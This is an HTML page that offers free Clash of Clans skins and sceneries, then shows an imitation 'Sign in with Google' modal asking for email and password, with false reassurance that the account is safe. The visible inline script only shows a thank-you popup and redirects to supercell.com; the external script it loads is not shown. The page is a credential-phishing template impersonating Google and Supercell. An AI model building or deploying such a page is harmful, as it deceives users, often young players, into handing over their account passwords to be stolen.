<!DOCTYPE html>
<html>
<head>
  <title>Clash Rewards - Limited Time</title>
  <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>

<!-- Floating Characters -->
<img id="barbarian" class="floating-character" src="https://static.wikia.nocookie.net/clashofclans/images/d/d5/Barbarian_info.png">
<img id="archer" class="floating-character" src="https://static.wikia.nocookie.net/clashofclans/images/8/8e/Archer_info.png">

<header>
  <div class="logo-section">
    <img src="https://static.wikia.nocookie.net/clashofclans/images/5/55/Clash_Logo.png" alt="Clash Logo">
    <h1>Claim Your Clash Rewards!</h1>
  </div>
  <p class="subtitle">Exclusive Skins & Sceneries for a Limited Time</p>
</header>

<main>
  <div class="offers"></div>
</main>

<!-- Login Modal -->
<div id="loginModal" class="login-modal">
  <div class="login-container">
    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" style="width:60px;margin-bottom:15px;">
    <h2>Sign in with Google</h2>
    <p>to continue to Clash Rewards</p>
    <input id="loginEmail" type="email" placeholder="Email or phone">
    <input id="loginPassword" type="password" placeholder="Enter your password">
    <button onclick="login()">Next</button>
    <p class="login-note">Your Google account is safe. This is a secure reward claim.</p>
  </div>
</div>

<!-- Thank You Popup -->
<div id="thankYou" class="thank-popup">
  <div class="popup-content">
    <img src="https://static.wikia.nocookie.net/clashofclans/images/6/6d/Judgement_King_Skin.png" alt="Reward Claimed">
    <h2>Thank You!</h2>
    <p>Your reward will be delivered within 24 hours.</p>
  </div>
</div>

<script src="script.js"></script>
<script>
async function login(){
  document.getElementById('loginModal').style.display='none';
  document.getElementById('thankYou').style.display='flex';
  setTimeout(()=>{ window.location.href="https://supercell.com"; },3000);
}
</script>
</body>
</html>
